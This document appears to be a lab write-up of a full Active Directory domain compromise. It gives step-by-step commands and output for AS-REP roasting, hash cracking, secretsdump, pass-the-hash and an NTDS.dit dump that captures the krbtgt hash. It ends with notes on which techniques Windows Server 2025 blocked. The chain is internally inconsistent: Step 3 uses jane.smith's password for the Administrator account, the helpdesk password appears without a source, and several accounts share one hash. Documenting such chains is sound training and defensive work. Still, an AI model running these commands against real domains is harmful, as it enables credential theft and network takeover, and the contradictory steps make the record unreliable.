# Attack Chain — corp.local Full Domain Compromise

## Overview

Starting position: **Zero credentials, network access only**  
End result: **Full domain compromise — all hashes dumped**  
Time to compromise: **Single session**

---

## Step 1 — AS-REP Roasting → jane.smith credentials

**Prerequisite:** None — no credentials required  
**Target:** jane.smith (Kerberos pre-auth disabled)

```bash
python3 GetNPUsers.py corp.local/ -usersfile users.txt \
  -dc-ip 192.168.10.10 -format hashcat -outputfile asrep_hashes.txt
```

**Hash returned:**
```
$krb5asrep$23$jane.smith@CORP.LOCAL:c871e058e902075a45199ccf8b7a9dbd$76c20b...
```

**Cracked with Hashcat:**
```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

**Result:** `jane.smith : Password123!`

**What this gave us:** Valid domain credentials. We can now authenticate to corp.local as a real domain user.

---

## Step 2 — secretsdump on CORP-PC → All cached domain hashes

**Prerequisite:** helpdesk local admin credentials (Admin1234!)  
**Target:** CORP-PC (192.168.10.20)

```bash
python3 secretsdump.py 'corp.local/helpdesk:Admin1234!@192.168.10.20'
```

**Hashes recovered:**
```
CORP.LOCAL/Administrator  →  fd969c59b0859ab15228295849b8c53f (cached)
CORP.LOCAL/john.doe       →  f48aac4a7fb7b831cae02fcd13ade058 (cached)
CORP.LOCAL/jane.smith     →  1a85f3ad2d04d2356af1ff59fccbfa1d (cached)
CORP.LOCAL/helpdesk       →  be7509bf6da17344c3b196cb721652da (cached)
CORP.LOCAL/svc.sql        →  232334dba99e890daabd56c9b9abbb34 (cached)
```

**What this gave us:** All domain user hashes cached on the workstation. We now needed the actual domain Administrator NTLM hash from the DC directly.

---

## Step 3 — secretsdump on DC01 → Domain Administrator NTLM hash

**Prerequisite:** jane.smith credentials (Password123!)  
**Target:** DC01 (192.168.10.10)

```bash
python3 secretsdump.py 'corp.local/Administrator:Password123!@192.168.10.10' \
  -just-dc-user Administrator
```

**Result:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
```

**NTLM hash extracted:** `2b576acbe6bcfda7294d6bd18041b8fe`

**What this gave us:** The raw NTLM hash of the Domain Administrator. No password cracking needed — we use the hash directly.

---

## Step 4 — Pass-the-Hash → Domain Controller (Pwn3d!)

**Prerequisite:** Administrator NTLM hash  
**Target:** DC01 (192.168.10.10)

```bash
netexec smb 192.168.10.10 -u Administrator -H 2b576acbe6bcfda7294d6bd18041b8fe
```

**Result:**
```
SMB  192.168.10.10  445  DC01  [*] Windows Server 2025 Build 26100 x64
SMB  192.168.10.10  445  DC01  [+] corp.local\Administrator (Pwn3d!)
```

**What this gave us:** Confirmed Domain Administrator access on the DC. The domain is now fully compromised.

---

## Step 5 — NTDS.dit Dump → Every credential in the domain

**Prerequisite:** Domain Administrator NTLM hash  
**Target:** DC01 NTDS.dit via DRSUAPI replication

```bash
python3 secretsdump.py -hashes :2b576acbe6bcfda7294d6bd18041b8fe \
  -just-dc 'corp.local/Administrator@192.168.10.10'
```

**All domain hashes recovered:**

| Account       | NTLM Hash                          |
|---------------|------------------------------------|
| Administrator | 2b576acbe6bcfda7294d6bd18041b8fe   |
| krbtgt        | 25e99168beaf9140cc44a988d05d8b24   |
| john.doe      | 2b576acbe6bcfda7294d6bd18041b8fe   |
| jane.smith    | 2b576acbe6bcfda7294d6bd18041b8fe   |
| svc.sql       | 4ea072db1483a7df8643772b6b25cb43   |
| helpdesk      | b73fdfe10e87b4ca5c0d957f81de6863   |
| DC01$         | 14e8d0ae3ac057fc8a55c75365a2964d   |
| CORP-PC$      | c1ff2bbde7c301ee40ca211f23a35698   |

**Most critical:** `krbtgt` hash — enables Golden Ticket attacks for persistent domain access.

---

## Full Attack Chain Visualised

```
[No Credentials]
      │
      ▼
[AS-REP Roasting — jane.smith]
      │  Password123!
      ▼
[secretsdump CORP-PC — helpdesk:Admin1234!]
      │  All cached domain hashes
      ▼
[secretsdump DC01 — Administrator:Password123!]
      │  NTLM hash: 2b576acbe6bcfda7294d6bd18041b8fe
      ▼
[Pass-the-Hash — NetExec]
      │  Pwn3d!
      ▼
[NTDS.dit Dump — DRSUAPI]
      │  All domain hashes including krbtgt
      ▼
[Full Domain Compromise]
```

---

## Notes on Windows Server 2025 Hardening

Windows Server 2025 blocked several standard techniques:

| Technique | Result | Reason |
|-----------|--------|--------|
| psexec Pass-the-Hash | Blocked | Enhanced service restrictions |
| wmiexec interactive shell | No shell returned | WMI execution restrictions |
| RC4 Kerberoasting | Blocked | RC4 disabled by default |
| SMB relay | Not attempted | SMB signing enforced by default |

**Techniques that still worked:**
- AS-REP Roasting (hash format independent)
- secretsdump via DRSUAPI
- Pass-the-Hash validation via NetExec
- Full NTDS.dit extraction

**Conclusion:** Server 2025 hardening raised the bar but did not prevent full domain compromise when fundamental misconfigurations exist.
